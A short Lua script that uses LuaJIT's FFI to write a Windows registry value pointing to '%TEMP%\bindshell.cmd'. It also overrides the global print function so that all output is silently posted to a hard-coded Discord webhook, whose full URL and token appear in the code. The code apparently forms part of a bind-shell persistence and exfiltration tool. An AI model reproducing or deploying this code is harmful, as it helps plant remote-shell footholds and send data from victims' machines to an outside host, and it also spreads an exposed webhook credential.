local ffi = require("ffi")
local http = require("socket.http")
local ltn12 = require("ltn12")

-- Discord Webhook URL
local discord_webhook_url = "https://discord.com/api/webhooks/1268854626288140372/Jp_jALGydP2E3ZGckb3FOVzc9ZhkJqKxsKzHVegnO-OIAwAWymr6lsbjCK0DAP_ttRV2"

-- Function to send a message to the Discord webhook
local function send_to_discord(message)
    local payload = string.format('{"content": "%s"}', message)
    local response_body = {}

    http.request{
        url = discord_webhook_url,
        method = "POST",
        headers = {
            ["Content-Type"] = "application/json",
            ["Content-Length"] = tostring(#payload)
        },
        source = ltn12.source.string(payload),
        sink = ltn12.sink.table(response_body)
    }

    return table.concat(response_body)
end

-- Override print function to send messages to Discord
local original_print = print
print = function(...)
    local message = table.concat({...}, " ")
    original_print(message)
    send_to_discord(message)
end

-- Load the Windows Registry API library
local advapi32 = ffi.load("advapi32")

-- Define Windows API functions and constants
ffi.cdef[[
    typedef void* HKEY;
    typedef unsigned long DWORD;
    typedef long LONG;
    typedef const char* LPCSTR;

    LONG RegOpenKeyA(HKEY hKey, LPCSTR lpSubKey, HKEY* phkResult);
    LONG RegCreateKeyA(HKEY hKey, LPCSTR lpSubKey, HKEY* phkResult);
    LONG RegSetValueExA(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const void* lpData, DWORD cbData);
    LONG RegCloseKey(HKEY hKey);
    void SetLastError(DWORD dwErrCode);
    void* GetProcessHeap();
    void* HeapAlloc(void* hHeap, DWORD dwFlags, size_t dwBytes);
    void HeapFree(void* hHeap, DWORD dwFlags, void* lpMem);
]]

-- Constants
local HKEY_CURRENT_USER = ffi.cast("HKEY", 0x80000001)
local REG_SZ = 1

-- Function to write a registry value
function writeRegistryValue(key, subKey, valueName, valueData)
    local hKey = ffi.new("HKEY[1]")
    local result = advapi32.RegCreateKeyA(key, subKey, hKey)

    if result == 0 then
        local data = ffi.new("const char[?]", #valueData + 1, valueData)
        local dataSize = ffi.sizeof(data)

        result = advapi32.RegSetValueExA(hKey[0], valueName, 0, REG_SZ, data, dataSize)

        if result == 0 then
            advapi32.RegCloseKey(hKey[0])
            return true
        end
        advapi32.RegCloseKey(hKey[0])
    end

    return false
end

-- Example usage to write a file path to the registry
local filePath = "%TEMP%\\bindshell.cmd"
local success = writeRegistryValue(HKEY_CURRENT_USER, "Software\\MyApp", "FilePath", filePath)
if success then
    print("Successfully wrote the registry value.")
else
    print("Failed to write the registry value.")
end
